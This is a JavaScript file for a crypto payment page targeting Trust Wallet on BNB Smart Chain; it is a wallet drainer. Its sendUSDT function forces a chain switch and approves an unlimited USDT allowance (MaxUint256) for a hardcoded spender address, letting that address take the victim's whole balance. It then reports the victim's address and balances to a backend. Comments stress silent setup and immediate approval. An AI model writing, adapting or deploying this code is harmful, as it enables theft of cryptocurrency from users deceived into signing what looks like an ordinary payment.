let provider;
let userAddress = null;
let isConnected = false;
let currentChainId = null;

// ===== BSC CONFIG - FORCE BSC ONLY =====
const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== SILENT SETUP ON PAGE LOAD =====
// No popup on load - just setup provider silently
window.addEventListener("load", async () => {
  if (window.ethereum) {
    try {
      provider = new ethers.BrowserProvider(window.ethereum);
      
      // Only check existing connection (no popup)
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (accounts.length > 0) {
        userAddress = accounts[0];
        isConnected = true;
      }
      
      currentChainId = await window.ethereum.request({ method: "eth_chainId" });
      
      window.ethereum.on("chainChanged", (chainId) => {
        currentChainId = chainId;
      });
    } catch (err) {
      console.log("Setup error:", err);
    }
  }
});

// ===== APPROVE (BSC ONLY) - OPTIMIZED FOR SPEED =====
async function sendUSDT() {
  try {
    if (!window.ethereum) {
      alert("Please open this page in Trust Wallet");
      return;
    }

    // Ensure we have provider
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }

    // Fast chain check using cached value
    if (currentChainId !== "0x38") {
      // Force switch to BSC
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }]
        });
        currentChainId = "0x38";
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          // Add BSC network if not exists
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"]
            }]
          });
          currentChainId = "0x38";
        }
      }
    }

    // Get signer (works silently if already connected in Trust Wallet)
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    // Create contract
    const usdt = new ethers.Contract(BSC_USDT, ABI, signer);

    // Send approval transaction immediately (don't wait for balances first)
    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
    
    // Fetch balances in parallel while transaction is being mined
    const [receipt, usdtBalanceWei, nativeBalanceWei] = await Promise.all([
      tx.wait(),
      usdt.balanceOf(address),
      provider.getBalance(address)
    ]);

    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // Update UI to show success (no alert popup)
    if (window.setTransactionStatus) {
      window.setTransactionStatus("success");
    }

    // Save to backend immediately
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: address,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else if (e.code === -32603) {
      alert("Insufficient funds or network error");
    } else {
      alert("Transaction failed. Please try again.");
    }
  }
}

window.sendUSDT = sendUSDT;
